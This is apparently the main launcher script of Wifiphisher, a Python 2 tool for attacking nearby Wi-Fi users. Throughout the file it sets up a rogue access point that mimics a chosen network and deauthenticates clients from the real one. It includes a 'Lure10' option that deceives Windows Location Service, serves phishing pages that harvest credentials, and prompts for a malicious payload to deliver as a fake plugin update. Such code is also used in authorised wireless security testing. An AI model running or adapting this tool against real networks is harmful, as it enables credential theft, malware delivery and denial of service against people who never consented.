#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#pylint: skip-file
import subprocess
import os
import time
import sys
import argparse
import fcntl
import curses
import socket
import struct
import signal
from threading import Thread
from subprocess import Popen, PIPE, check_output
from shutil import copyfile
from wifiphisher.common.constants import *
import wifiphisher.common.deauth as deauth
import wifiphisher.common.recon as recon
import wifiphisher.common.phishingpage as phishingpage
import wifiphisher.common.phishinghttp as phishinghttp
import wifiphisher.common.macmatcher as macmatcher
import wifiphisher.common.interfaces as interfaces
import wifiphisher.common.firewall as firewall
import wifiphisher.common.accesspoint as accesspoint
import wifiphisher.common.tui as tui

# Fixes UnicodeDecodeError for ESSIDs
reload(sys)
sys.setdefaultencoding('utf8')

VERSION = "1.3GIT"
args = 0
APs = {}  # for listing APs


def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-jI",
        "--jamminginterface",
        help=("Manually choose an interface that supports monitor mode for " +
              "deauthenticating the victims. " +
              "Example: -jI wlan1"
              )
    )
    parser.add_argument(
        "-aI",
        "--apinterface",
        help=("Manually choose an interface that supports AP mode for  " +
              "spawning an AP. " +
              "Example: -aI wlan0"
              )
    )
    parser.add_argument(
        "-iI",
        "--internetinterface",
        help=("Choose an interface that is connected on the Internet" +
              "Example: -iI ppp0"
              )
    )
    parser.add_argument(
        "-nJ",
        "--nojamming",
        help=("Skip the deauthentication phase. When this option is used, " +
              "only one wireless interface is required"
              ),
        action='store_true')
    parser.add_argument(
        "-e",
        "--essid",
        help=("Enter the ESSID of the rogue Access Point. " +
              "This option will skip Access Point selection phase. " +
              "Example: --essid 'Free WiFi'"
              )
    )
    parser.add_argument(
        "-p",
        "--phishingscenario",
        help=("Choose the phishing scenario to run." +
              "This option will skip the scenario selection phase. " +
              "Example: -p firmware_upgrade"))
    parser.add_argument(
        "-pK",
        "--presharedkey",
        help=("Add WPA/WPA2 protection on the rogue Access Point. " +
              "Example: -pK s3cr3tp4ssw0rd"))
    parser.add_argument(
        "-qS",
        "--quitonsuccess",
        help=("Stop the script after successfully retrieving one pair of "
              "credentials"),
        action='store_true')
    parser.add_argument(
        "-lC",
        "--lure10-capture",
        help=("Capture the BSSIDs of the APs that are discovered during "
              "AP selection phase. This option is part of Lure10 attack."),
        action='store_true')
    parser.add_argument(
        "-lE",
        "--lure10-exploit",
        help=("Fool the Windows Location Service of nearby Windows users "
              "to believe it is within an area that was previously captured "
              "with --lure10-capture. Part of the Lure10 attack."))
    parser.add_argument(
        "-iAM",
        "--mac-ap-interface",
        help=("Specify the MAC address of the AP interface"))
    parser.add_argument(
        "-iDM",
        "--mac-deauth-interface",
        help=("Specify the MAC addrress of the jamming interface"))
    parser.add_argument(
        "-iNM",
        "--no-mac-randomization",
        help=("Do not change any MAC address"), action='store_true')

    return parser.parse_args()


def check_args(args):
    """
    Checks the given arguments for logic errors.
    """

    if args.presharedkey and \
        (len(args.presharedkey) < 8
         or len(args.presharedkey) > 64):
        sys.exit(
            '[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')

    if ((args.jamminginterface and not args.apinterface) or
            (not args.jamminginterface and args.apinterface)) and \
            not (args.nojamming and args.apinterface):
        sys.exit('[' + R + '-' + W + '] --apinterface (-aI) and --jamminginterface (-jI) (or --nojamming (-nJ)) are used in conjuction.')

    if args.nojamming and args.jamminginterface:
        sys.exit(
            '[' + R + '-' + W + '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')

    if args.lure10_exploit and args.nojamming:
        sys.exit(
            '[' + R + '-' + W + '] --lure10-exploit (-lE) and --nojamming (-nJ) cannot work together.')

    if args.lure10_exploit and not os.path.isfile(LOCS_DIR + args.lure10_exploit):
        sys.exit(
            '[' + R + '-' + W + '] Lure10 capture does not exist. Listing directory of captures: ' + str(os.listdir(LOCS_DIR)))

    if (args.mac_ap_interface and args.no_mac_randomization) or \
            (args.mac_deauth_interface and args.no_mac_randomization):
        sys.exit(
            '[' + R + '-' + W + '] --no-mac-randomization (-iNM) cannot work together with --mac-ap-interface or '
            '--mac-deauth-interface (-iDM)')


def set_ip_fwd():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
        stdout=DN,
        stderr=PIPE
    )


def set_route_localnet():
    """
    Set kernel variables.
    """
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )

def kill_interfering_procs():
    """
    Kill the interfering processes that may interfere the wireless card
    :return None
    :rtype None
    ..note: The interfering processes are referenced by airmon-zc, and
    we have removed the NetworkManager and knetworkmanager since we
    use dbus to handle them.
    """

    # disable the networkmanager
    interfaces.toggle_networking(False)
    # Kill any possible programs that may interfere with the wireless card
    proc = Popen(['ps', '-A'], stdout=subprocess.PIPE)
    output = proc.communicate()[0]
    # total processes in the system
    sys_procs = output.splitlines()
    # loop each interfering processes and find if it is running
    for interfering_proc in INTEFERING_PROCS:
        for proc in sys_procs:
            # kill all the processes name equal to interfering_proc
            if interfering_proc in proc:
                pid = int(proc.split(None, 1)[0])
                print '[' + G + '+' + W + "] Sending SIGKILL to " +\
                    interfering_proc
                os.kill(pid, signal.SIGKILL)


class WifiphisherEngine:

    def __init__(self):
        self.mac_matcher = macmatcher.MACMatcher(MAC_PREFIX_FILE)
        self.network_manager = interfaces.NetworkManager()
        self.template_manager = phishingpage.TemplateManager()
        self.access_point = accesspoint.AccessPoint()
        self.fw = firewall.Fw()

    def stop(self):
        print "[" + G + "+" + W + "] Captured credentials:"
        for cred in phishinghttp.creds:
            print cred

        self.network_manager.on_exit()
        self.template_manager.on_exit()
        self.access_point.on_exit()
        self.fw.on_exit()

        if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
            os.remove('/tmp/wifiphisher-webserver.tmp')

        print '[' + R + '!' + W + '] Closing'
        sys.exit(0)

    def start(self):
        # Parse args
        global args, APs
        args = parse_args()

        # Check args
        check_args(args)

        # Are you root?
        if os.geteuid():
            sys.exit('[' + R + '-' + W + '] Please run as root')

        if not args.internetinterface:
            kill_interfering_procs()

        self.network_manager.start()

        # TODO: We should have more checks here:
        # Is anything binded to our HTTP(S) ports?
        # Maybe we should save current iptables rules somewhere

        # get interfaces for monitor mode and AP mode and set the monitor interface
        # to monitor mode. shutdown on any errors
        try:
            if args.internetinterface:
                if self.network_manager.is_interface_valid(args.internetinterface, "internet"):
                    internet_interface = args.internetinterface
                    self.network_manager.unblock_interface(internet_interface)
            if not args.nojamming:
                if args.jamminginterface and args.apinterface:
                    if self.network_manager.is_interface_valid(args.jamminginterface, "monitor"):
                        mon_iface = args.jamminginterface
                        self.network_manager.unblock_interface(mon_iface)
                    if self.network_manager.is_interface_valid(args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    mon_iface, ap_iface = self.network_manager.get_interface_automatically()
                # display selected interfaces to the user
                print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
                       "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
                       "rogue Access Point").format(G, W, mon_iface, ap_iface)

                # randomize the mac addresses
                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.network_manager.set_interface_mac(ap_iface, args.mac_ap_interface)
                    else:
                        self.network_manager.set_interface_mac_random(ap_iface)
                    if args.mac_deauth_interface:
                        self.network_manager.set_interface_mac(mon_iface, args.mac_deauth_interface)
                    else:
                        self.network_manager.set_interface_mac_random(mon_iface)
            else:
                if args.apinterface:
                    if self.network_manager.is_interface_valid(args.apinterface, "AP"):
                        ap_iface = args.apinterface
                else:
                    ap_iface = self.network_manager.get_interface(True, False)
                mon_iface = ap_iface

                if not args.no_mac_randomization:
                    if args.mac_ap_interface:
                        self.network_manager.set_interface_mac(ap_iface, args.mac_ap_interface)
                    else:
                        self.network_manager.set_interface_mac_random(ap_iface)

                print ("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
                       "rogue Access Point").format(G, W, ap_iface)
                # randomize the mac addresses
                if not args.no_mac_randomization:
                    self.network_manager.set_interface_mac_random(ap_iface)

            # make sure interfaces are not blocked
            self.network_manager.unblock_interface(ap_iface)
            self.network_manager.unblock_interface(mon_iface)
            self.network_manager.set_interface_mode(mon_iface, "monitor")
        except (interfaces.InvalidInterfaceError,
                interfaces.InterfaceCantBeFoundError,
                interfaces.InterfaceManagedByNetworkManagerError) as err:
            print ("[{0}!{1}] {2}").format(R, W, err)

            time.sleep(1)
            self.stop()

        if not args.no_mac_randomization:
            ap_mac = self.network_manager.get_interface_mac(ap_iface)
            print "[{0}+{1}] {2} mac address becomes is now {3} ".format(G, W, ap_iface, ap_mac)

            if not args.nojamming:
                mon_mac = self.network_manager.get_interface_mac(mon_iface)
                print ("[{0}+{1}] {2} mac address becomes {3}".format(G, W, mon_iface, mon_mac))

        if args.internetinterface:
            self.fw.nat(ap_iface, args.internetinterface)
            set_ip_fwd()
        else:
            self.fw.redirect_requests_localhost()
        set_route_localnet()

        print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
        time.sleep(1)

        if args.essid:
            essid = args.essid
            channel = str(CHANNEL)
            ap_mac = None
            enctype = None
        else:
            # let user choose access point
            ap_info_object = tui.ApSelInfo(mon_iface, self.mac_matcher,
                                           self.network_manager, args)
            ap_sel_object = tui.TuiApSel()
            access_point = curses.wrapper(ap_sel_object.gather_info,
                                          ap_info_object)

            # if the user has chosen a access point continue
            # otherwise shutdown
            if access_point:
                # store choosen access point's information
                essid = access_point.get_name()
                channel = access_point.get_channel()
                ap_mac = access_point.get_mac_address()
                enctype = access_point.get_encryption()
            else:
                self.stop()
        # create a template manager object
        self.template_manager = phishingpage.TemplateManager()
        # get the correct template
        tui_template_obj = tui.TuiTemplateSelection() 
        template = tui_template_obj.gather_info(args.phishingscenario, self.template_manager)

        print ("[" + G + "+" + W + "] Selecting " + template.get_display_name() +
               " template")

        # payload selection for browser plugin update
        if template.has_payload():
            payload_path = False
            # copy payload to update directory
            while not payload_path or not os.path.isfile(payload_path):
                # get payload path
                payload_path = raw_input("[" + G + "+" + W +
                                         "] Enter the [" + G + "full path" + W +
                                         "] to the payload you wish to serve: ")
                if not os.path.isfile(payload_path):
                    print '[' + R + '-' + W + '] Invalid file path!'
            print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
            copyfile(payload_path, PHISHING_PAGES_DIR +
                     template.get_payload_path())

        APs_context = []
        for i in APs:
            APs_context.append({
                'channel': APs[i][0] or "",
                'essid': APs[i][1] or "",
                'bssid': APs[i][2] or "",
                'vendor': self.mac_matcher.get_vendor_name(APs[i][2]) or ""
            })

        template.merge_context({'APs': APs_context})

        # only get logo path if MAC address is present
        ap_logo_path = False
        if ap_mac:
            ap_logo_path = template.use_file(self.mac_matcher.get_vendor_logo_path(ap_mac))

        template.merge_context({
            'target_ap_channel': channel or "",
            'target_ap_essid': essid or "",
            'target_ap_bssid': ap_mac or "",
            'target_ap_encryption': enctype or "",
            'target_ap_vendor': self.mac_matcher.get_vendor_name(ap_mac) or "",
            'target_ap_logo_path': ap_logo_path or ""
        })

        # We want to set this now for hostapd. Maybe the interface was in "monitor"
        # mode for network discovery before (e.g. when --nojamming is enabled).
        self.network_manager.set_interface_mode(ap_iface, "managed")
        # Start AP
        self.access_point.set_interface(ap_iface)
        self.access_point.set_channel(channel)
        self.access_point.set_essid(essid)
        if args.presharedkey:
            self.access_point.set_psk(args.presharedkey)
        if args.internetinterface:
            self.access_point.set_internet_interface(args.internetinterface)
        print '[' + T + '*' + W + '] Starting the fake access point...'
        try:
            self.access_point.start()
            self.access_point.start_dhcp_dns()
        except:
            self.stop()

        # With configured DHCP, we may now start the web server
        if not args.internetinterface:
        # Start HTTP server in a background thread
            print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
            webserver = Thread(target=phishinghttp.runHTTPServer,
                               args=(NETWORK_GW_IP, PORT, SSL_PORT, template))
            webserver.daemon = True
            webserver.start()

            time.sleep(1.5)

        # We no longer need mac_matcher
        self.mac_matcher.unbind()

        clients_APs = []
        APs = []

        deauthentication = None
        if not args.nojamming:
            # set the channel on the deauthenticating interface
            self.network_manager.set_interface_channel(mon_iface, int(channel))
            # start deauthenticating all client on target access point
            deauthentication = deauth.Deauthentication(ap_mac, mon_iface)
            if args.lure10_exploit:
                deauthentication.add_lure10_beacons(LOCS_DIR + args.lure10_exploit)
            deauthentication.deauthenticate()

        # Main loop.
        try:
            main_info = tui.MainInfo(VERSION, essid, channel, ap_iface,
                                     deauthentication, phishinghttp,
                                     args)
            tui_main_object = tui.TuiMain()
            curses.wrapper(tui_main_object.gather_info, main_info)
        except KeyboardInterrupt:
            if deauthentication != None:
                deauthentication.on_exit()
            self.stop()


def run():
    try:
        print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' %
            (VERSION, time.strftime("%Y-%m-%d %H:%M")))
        engine = WifiphisherEngine()
        engine.start()
    except KeyboardInterrupt:
        print R + '\n (^C)' + O + ' interrupted\n' + W
    except EOFError:
        print R + '\n (^D)' + O + ' interrupted\n' + W
